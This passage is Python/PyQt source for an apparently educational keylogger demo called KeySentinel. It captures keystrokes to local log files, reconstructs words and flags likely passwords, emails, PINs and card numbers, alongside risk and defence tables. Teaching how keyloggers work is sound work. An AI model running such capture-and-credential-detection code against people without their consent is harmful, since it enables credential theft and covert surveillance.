    # ── RISK TAB ──────────────────────────────────────────────────────────────
    def _build_risk_tab(self):
        w   = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(12, 12, 12, 12)
        lay.setSpacing(10)

        # Warning banner
        banner = QFrame()
        banner.setFixedHeight(50)
        banner.setStyleSheet(f'''
            QFrame {{
                background: #1a0505;
                border: 1px solid {P["red"]};
                border-radius: 6px;
            }}
        ''')
        bl = QHBoxLayout(banner)
        bl.setContentsMargins(16, 0, 16, 0)
        icon = QLabel('⚠')
        icon.setStyleSheet(f'color:{P["red"]};font-size:20px;background:transparent;')
        txt  = QLabel('  This tab demonstrates what an attacker could extract from captured keystrokes. '
                      'All analysis is local — no data leaves this machine.')
        txt.setStyleSheet(f'color:{P["text"]};font-family:Consolas;font-size:11px;background:transparent;')
        bl.addWidget(icon); bl.addWidget(txt); bl.addStretch()
        lay.addWidget(banner)

        # Two columns
        cols = QHBoxLayout()
        cols.setSpacing(10)

        # Credential detection
        grp1 = QGroupBox('POTENTIAL CREDENTIAL DETECTION')
        gl1  = QVBoxLayout(grp1)
        self.cred_tbl = self._make_table(['Word / Pattern', 'Reason', 'Risk'])
        self.cred_tbl.setMinimumHeight(200)
        gl1.addWidget(self.cred_tbl)
        cols.addWidget(grp1)

        # Typing patterns
        grp2 = QGroupBox('BEHAVIOURAL PATTERNS')
        gl2  = QVBoxLayout(grp2)
        self.behav_tbl = self._make_table(['Pattern', 'Value', 'Implication'])
        self.behav_tbl.setMinimumHeight(200)
        gl2.addWidget(self.behav_tbl)
        cols.addWidget(grp2)
        lay.addLayout(cols)

        # Risk matrix display
        grp3 = QGroupBox('ATTACK RISK MATRIX')
        gl3  = QVBoxLayout(grp3)
        risk_tbl = self._make_table(['Scenario', 'Likelihood', 'Impact', 'Primary Data at Risk'])
        rows = [
            ('Credential theft',      '🔴 VERY HIGH', '🔴 CRITICAL',  'Passwords, PINs, tokens'),
            ('Financial fraud',       '🔴 HIGH',      '🔴 CRITICAL',  'Card numbers, banking creds'),
            ('Identity theft',        '🟠 HIGH',      '🟠 HIGH',       'Name, DOB, email, address'),
            ('Corporate espionage',   '🟠 MEDIUM',    '🟠 HIGH',       'Code, strategy, IP'),
            ('Session hijacking',     '🟡 MEDIUM',    '🟠 HIGH',       'Auth tokens, OTPs'),
            ('Privacy violation',     '🔴 VERY HIGH', '🟡 MEDIUM',     'Messages, searches, notes'),
            ('Targeted phishing',     '🟠 MEDIUM',    '🟡 MEDIUM',     'Contacts, relationships'),
        ]
        for r in rows:
            ri = risk_tbl.rowCount()
            risk_tbl.insertRow(ri)
            for ci, v in enumerate(r):
                it = QTableWidgetItem(v)
                if ci in (1,2):
                    color = P['red'] if '🔴' in v else (P['amber'] if '🟠' in v else '#aaaa00')
                    it.setForeground(QBrush(QColor(color)))
                risk_tbl.setItem(ri, ci, it)
        gl3.addWidget(risk_tbl)
        lay.addWidget(grp3, 1)

        # Defences
        grp4 = QGroupBox('DEFENCES & MITIGATIONS')
        gl4  = QVBoxLayout(grp4)
        defences = self._make_table(['Control', 'Effectiveness', 'How It Helps'])
        def_rows = [
            ('Multi-Factor Authentication', '★★★★★ Critical', 'Stolen password alone is useless without 2nd factor'),
            ('Password Manager',            '★★★★☆ High',     'Auto-fill — no keystrokes on password field'),
            ('Antivirus / EDR',             '★★★★☆ High',     'Detects hook-based keylogger signatures'),
            ('App Allowlisting',            '★★★★☆ High',     'Prevents unknown executables from running'),
            ('OS Patching',                 '★★★☆☆ Medium',   'Closes exploitation vectors keyloggers use'),
            ('Virtual Keyboard',            '★★☆☆☆ Low-Med',  'Mouse clicks bypass keyboard hooks'),
            ('Full Disk Encryption',        '★★☆☆☆ Low',      'Protects log files at rest if device stolen'),
        ]
        for r in def_rows:
            ri = defences.rowCount()
            defences.insertRow(ri)
            for ci, v in enumerate(r):
                it = QTableWidgetItem(v)
                if ci == 1:
                    stars = v.count('★')
                    c = [P['red'], P['red'], P['amber'], P['amber'], P['green'], P['green']][min(stars-1,5)]
                    it.setForeground(QBrush(QColor(c)))
                defences.setItem(ri, ci, it)
        gl4.addWidget(defences)
        lay.addWidget(grp4)

        return w

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _make_table(self, cols):
        t = QTableWidget(0, len(cols))
        t.setHorizontalHeaderLabels(cols)
        t.setEditTriggers(QAbstractItemView.NoEditTriggers)
        t.setSelectionBehavior(QAbstractItemView.SelectRows)
        t.verticalHeader().setVisible(False)
        t.verticalHeader().setDefaultSectionSize(24)
        t.horizontalHeader().setStretchLastSection(True)
        t.setAlternatingRowColors(True)
        t.setStyleSheet(f'''
            QTableWidget {{
                background: {P["bg"]};
                alternate-background-color: {P["panel"]};
                gridline-color: {P["border"]};
                color: {P["text"]};
                font-family: Consolas;
                font-size: 11px;
                border: none;
            }}
            QHeaderView::section {{
                background: {P["panel2"]};
                color: {P["text_dim"]};
                padding: 6px 10px;
                border: none;
                border-right: 1px solid {P["border"]};
                border-bottom: 1px solid {P["border"]};
                font-family: Consolas;
                font-size: 10px;
                letter-spacing: 1px;
            }}
        ''')
        return t

    # ── Capture control ───────────────────────────────────────────────────────
    def start_capture(self):
        if self._running: return
        if not HAS_PYNPUT:
            QMessageBox.critical(self, 'Missing', 'pip install pynput')
            return
        self._running = True
        self._elapsed = 0
        # Clear log file
        LOG_FILE.write_text('')
        self.engine.session = {
            'start': None, 'total': 0, 'printable': 0,
            'special': 0, 'backspaces': 0, 'enters': 0,
            'words': [], 'events': [],
            'freq': Counter(), 'cat_freq': Counter(),
            'per_second': deque(maxlen=120),
        }
        self.engine.start()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self._indicator.setText('● LIVE')
        self._indicator.setStyleSheet(f'color:{P["green"]};font-family:Consolas;font-size:12px;font-weight:bold;background:transparent;')
        self._status_lbl.setText('Capturing keystrokes  |  Press STOP to end session  |  ESC key stops listener')

    def stop_capture(self):
        if not self._running: return
        self._running = False
        self.engine.stop()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self._indicator.setText('● STOPPED')
        self._indicator.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:12px;font-weight:bold;background:transparent;')
        s = self.engine.session
        self._status_lbl.setText(f'Session ended  |  {s["total"]:,} keys captured  |  Saved to {JSON_FILE}')

    def clear_all(self):
        self.stop_capture()
        self.engine.session = {
            'start': None, 'total': 0, 'printable': 0,
            'special': 0, 'backspaces': 0, 'enters': 0,
            'words': [], 'events': [],
            'freq': Counter(), 'cat_freq': Counter(),
            'per_second': deque(maxlen=120),
        }
        self.terminal.clear()
        self.word_cloud.set_words([])
        self.analysis.clear()
        self.heatmap.update_freq({})
        for t in [self.top_keys_tbl, self.words_tbl, self.session_tbl,
                  self.cat_tbl, self.cred_tbl, self.behav_tbl, self.bigram_tbl]:
            t.setRowCount(0)
        self._elapsed = 0
        self._elapsed_lbl.setText('00:00:00')
        self._update_stat_cards()
        self._indicator.setText('● IDLE')
        self._indicator.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:12px;font-weight:bold;background:transparent;')

    # ── Event handling ────────────────────────────────────────────────────────
    @pyqtSlot(dict)
    def _on_key(self, evt):
        with self._lock:
            self._pending.append(evt)

    def _flush_events(self):
        with self._lock:
            batch = self._pending[:]
            self._pending.clear()
        for evt in batch:
            self.terminal.append_key(evt['label'], evt['cat'])
            self.key_stream.add_key(evt['label'], evt['cat'])

    def _on_error(self, msg):
        QMessageBox.critical(self, 'Error', msg)
        self.stop_capture()

    # ── Stats update ──────────────────────────────────────────────────────────
    def _update_stats(self):
        self._update_stat_cards()
        self._update_analysis_tab()
        self._update_heatmap_tab()
        self._update_risk_tab()
        if HAS_PG: self._update_charts()

    def _update_stat_cards(self):
        s = self.engine.session
        total = s['total']
        pps   = list(s['per_second'])
        rate  = pps[-1] if pps else 0
        self.c_total.set_value(f'{total:,}',           f'{"running" if self._running else "stopped"}')
        self.c_chars.set_value(f'{s["printable"]:,}',  f'{s["printable"]/max(total,1)*100:.0f}% of total')
        self.c_words.set_value(f'{len(s["words"]):,}', f'reconstructed')
        self.c_backs.set_value(f'{s["backspaces"]:,}', f'{s["backspaces"]/max(total,1)*100:.0f}% error rate')
        self.c_enters.set_value(f'{s["enters"]:,}',    f'line/form submits')
        self.c_rate.set_value(f'{rate}',                f'keys/sec')

    def _update_analysis_tab(self):
        s   = self.engine.session
        tot = s['total'] or 1

        # Top keys
        self.top_keys_tbl.setRowCount(0)
        top = s['freq'].most_common(20)
        max_c = top[0][1] if top else 1
        for key, cnt in top:
            r = self.top_keys_tbl.rowCount()
            self.top_keys_tbl.insertRow(r)
            bar = '█' * int(cnt/max_c*20) + '░' * (20 - int(cnt/max_c*20))
            for ci, v in enumerate([repr(key), str(cnt), f'{cnt/tot*100:.1f}%', bar]):
                it = QTableWidgetItem(v)
                if ci == 3: it.setForeground(QBrush(QColor(P['cyan'])))
                self.top_keys_tbl.setItem(r, ci, it)

        # Words
        self.words_tbl.setRowCount(0)
        wc = Counter(s['words'])
        for word, cnt in wc.most_common(30):
            r = self.words_tbl.rowCount()
            self.words_tbl.insertRow(r)
            sus = self._suspicious(word)
            for ci, v in enumerate([word, str(cnt), sus or '—']):
                it = QTableWidgetItem(v)
                if ci == 2 and sus:
                    it.setForeground(QBrush(QColor(P['red'])))
                self.words_tbl.setItem(r, ci, it)

        # Session stats
        self.session_tbl.setRowCount(0)
        rows = [
            ('Start time',      s.get('start', '—') or '—'),
            ('Total keystrokes', f'{s["total"]:,}'),
            ('Printable chars',  f'{s["printable"]:,}'),
            ('Special keys',     f'{s["special"]:,}'),
            ('Backspaces',       f'{s["backspaces"]:,}'),
            ('Enter presses',    f'{s["enters"]:,}'),
            ('Unique words',     f'{len(set(s["words"])):,}'),
            ('Error rate',       f'{s["backspaces"]/max(tot,1)*100:.1f}%'),
            ('Log file',         str(LOG_FILE.resolve())),
        ]
        for k, v in rows:
            r = self.session_tbl.rowCount()
            self.session_tbl.insertRow(r)
            it_k = QTableWidgetItem(k)
            it_k.setForeground(QBrush(QColor(P['text_dim'])))
            it_v = QTableWidgetItem(v)
            it_v.setForeground(QBrush(QColor(P['bright'])))
            self.session_tbl.setItem(r, 0, it_k)
            self.session_tbl.setItem(r, 1, it_v)

        # Category breakdown
        self.cat_tbl.setRowCount(0)
        descs = {
            'printable': 'Letters, numbers, symbols — direct content',
            'space':     'Word boundaries — enables reconstruction',
            'enter':     'Line/form submits — login indicators',
            'backspace': 'Corrections — reveals uncertainty',
            'modifier':  'Ctrl/Shift/Alt — shortcut detection',
            'special':   'Navigation, Esc, Function keys',
            'function':  'F1–F12 — app-specific commands',
        }
        for cat, desc in descs.items():
            cnt = s['cat_freq'].get(cat, 0)
            r = self.cat_tbl.rowCount()
            self.cat_tbl.insertRow(r)
            color = KEY_COLORS.get(cat, P['text'])
            for ci, v in enumerate([cat.upper(), str(cnt), desc]):
                it = QTableWidgetItem(v)
                if ci == 0: it.setForeground(QBrush(QColor(color)))
                self.cat_tbl.setItem(r, ci, it)

        # Word cloud
        self.word_cloud.set_words(s['words'])

        # Analysis findings
        self._run_analysis(s)

    def _update_heatmap_tab(self):
        s = self.engine.session
        self.heatmap.update_freq(dict(s['freq']))

        # Bigrams
        events = s['events']
        self.bigram_tbl.setRowCount(0)
        chars = [e['char'] for e in events if e['cat']=='printable' and e['char']]
        bigrams = Counter()
        for i in range(len(chars)-1):
            bigrams[chars[i]+chars[i+1]] += 1
        for bg, cnt in bigrams.most_common(20):
            r = self.bigram_tbl.rowCount()
            self.bigram_tbl.insertRow(r)
            ctx = 'common English' if bg in ('th','he','in','er','an','re','on','en','at','es') else ''
            for ci, v in enumerate([f"'{bg}'", str(cnt), ctx]):
                it = QTableWidgetItem(v)
                if ci == 0: it.setForeground(QBrush(QColor(P['cyan'])))
                self.bigram_tbl.setItem(r, ci, it)

    def _update_risk_tab(self):
        s = self.engine.session
        tot = s['total'] or 1
        words = s['words']

        # Credential detection
        self.cred_tbl.setRowCount(0)
        for w in set(words):
            reason = self._suspicious(w)
            if reason:
                r = self.cred_tbl.rowCount()
                self.cred_tbl.insertRow(r)
                risk = 'CRITICAL' if 'password' in reason else ('HIGH' if 'email' in reason else 'MEDIUM')
                for ci, v in enumerate([w, reason, risk]):
                    it = QTableWidgetItem(v)
                    col = P['red'] if risk=='CRITICAL' else (P['amber'] if risk=='HIGH' else P['purple'])
                    it.setForeground(QBrush(QColor(col)))
                    self.cred_tbl.setItem(r, ci, it)

        # Behavioural
        self.behav_tbl.setRowCount(0)
        err_rate = s['backspaces'] / max(tot, 1) * 100
        brows = [
            ('Error rate',      f'{err_rate:.1f}%',
             'High hesitation' if err_rate>15 else 'Normal typing'),
            ('Enter presses',   str(s['enters']),
             'Possible login form submits' if s['enters']>3 else 'Low form activity'),
            ('Unique words',    str(len(set(words))),
             'Rich vocabulary captured' if len(set(words))>50 else 'Limited sample'),
            ('Longest word',    max((w for w in words), key=len, default='—'),
             'Long tokens suggest password/hash'),
            ('Numeric words',   str(sum(1 for w in words if w.isdigit())),
             'Could be PINs or card numbers'),
        ]
        for k, v, impl in brows:
            r = self.behav_tbl.rowCount()
            self.behav_tbl.insertRow(r)
            for ci, txt in enumerate([k, v, impl]):
                it = QTableWidgetItem(txt)
                if ci == 0: it.setForeground(QBrush(QColor(P['text_dim'])))
                self.behav_tbl.setItem(r, ci, it)

    def _update_charts(self):
        s  = self.engine.session
        ps = list(s['per_second'])
        if ps:
            self.tl_curve.setData(list(range(len(ps))), ps)

        # Category chart
        cats   = list(KEY_COLORS.keys())
        counts = [s['cat_freq'].get(c, 0) for c in cats]
        colors = [QColor(KEY_COLORS[c]) for c in cats]
        self.cat_plot.clear()
        bg = pg.BarGraphItem(x=range(len(cats)), height=counts, width=0.6, brushes=colors)
        self.cat_plot.addItem(bg)
        ax = self.cat_plot.getAxis('bottom')
        ax.setTicks([[(i, c.upper()) for i, c in enumerate(cats)]])

    def _tick(self):
        if self._running:
            self._elapsed += 1
        h = self._elapsed // 3600
        m = (self._elapsed % 3600) // 60
        s = self._elapsed % 60
        t = f'{h:02d}:{m:02d}:{s:02d}'
        self._elapsed_lbl.setText(t)
        self._clock_lbl.setText(t)

    # ── Analysis helpers ──────────────────────────────────────────────────────
    def _suspicious(self, word):
        if len(word) < 2: return None
        has_up  = any(c.isupper() for c in word)
        has_dig = any(c.isdigit() for c in word)
        has_sym = any(c in '!@#$%^&*_-+=?' for c in word)
        if len(word) >= 8 and sum([has_up, has_dig, has_sym]) >= 2:
            return 'Possible password/token'
        if '@' in word and '.' in word and len(word) > 5:
            return 'Possible email address'
        if word.isdigit() and len(word) in (4, 6, 10, 11, 16):
            lengths = {4:'PIN', 6:'OTP/PIN', 10:'Phone', 11:'Phone', 16:'Card number'}
            return f'Possible {lengths[len(word)]}'
        return None

    def _run_analysis(self, s):
        words = s['words']
        total = s['total'] or 1
        err   = s['backspaces'] / total * 100

        if total > 10:
            self.analysis.add_finding(
                f'{total:,} keystrokes captured this session', 'info')
        if err > 20:
            self.analysis.add_finding(
                f'High error rate ({err:.0f}%) — user struggling or correcting sensitive input', 'caution')
        if s['enters'] > 5:
            self.analysis.add_finding(
                f'{s["enters"]} Enter presses — possible form/login submissions detected', 'caution')
        for w in set(words):
            sus = self._suspicious(w)
            if sus:
                self.analysis.add_finding(f'"{w}" — {sus}', 'warn')
        if len(set(words)) > 30:
            self.analysis.add_finding(
                f'{len(set(words))} unique words reconstructed from keystrokes', 'info')
        nums = [w for w in words if w.isdigit() and len(w)>=4]
        if nums:
            self.analysis.add_finding(
                f'Numeric sequences detected: {", ".join(nums[:3])} — possible PINs/OTPs', 'warn')

    # ── Import / Export ───────────────────────────────────────────────────────
    def _save_json(self):
        path, _ = QFileDialog.getSaveFileName(self, 'Save JSON', 'keystroke_log.json', 'JSON (*.json)')
        if path:
            self.engine._save()
            import shutil; shutil.copy(JSON_FILE, path)
            self._status_lbl.setText(f'Saved → {path}')

    def _load_json(self):
        path, _ = QFileDialog.getOpenFileName(self, 'Load JSON', '', 'JSON (*.json)')
        if not path: return
        try:
            data = json.loads(Path(path).read_text())
            s = self.engine.session
            s['total']     = data.get('total', 0)
            s['printable'] = data.get('printable', 0)
            s['backspaces']= data.get('backspaces', 0)
            s['enters']    = data.get('enters', 0)
            s['words']     = data.get('words', [])
            s['freq']      = Counter(data.get('top_keys', {}))
            s['events']    = data.get('events', [])
            self._update_stats()
            self._status_lbl.setText(f'Loaded {s["total"]:,} events from {path}')
        except Exception as e:
            QMessageBox.critical(self, 'Load Error', str(e))

    def _export_txt(self):
        path, _ = QFileDialog.getSaveFileName(self, 'Export TXT', 'keystrokes.txt', 'Text (*.txt)')
        if path and LOG_FILE.exists():
            import shutil; shutil.copy(LOG_FILE, path)
            self._status_lbl.setText(f'Exported → {path}')

    def closeEvent(self, e):
        self.stop_capture()
        e.accept()


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    pal = QPalette()
    pal.setColor(QPalette.Window,          QColor(P['bg']))
    pal.setColor(QPalette.WindowText,      QColor(P['text']))
    pal.setColor(QPalette.Base,            QColor(P['panel']))
    pal.setColor(QPalette.AlternateBase,   QColor(P['panel2']))
    pal.setColor(QPalette.Text,            QColor(P['text']))
    pal.setColor(QPalette.Button,          QColor(P['panel2']))
    pal.setColor(QPalette.ButtonText,      QColor(P['text']))
    pal.setColor(QPalette.Highlight,       QColor(P['cyan_dim']))
    pal.setColor(QPalette.HighlightedText, QColor(P['bright']))
    app.setPalette(pal)
    win = KeySentinel()
    sys.exit(app.exec_())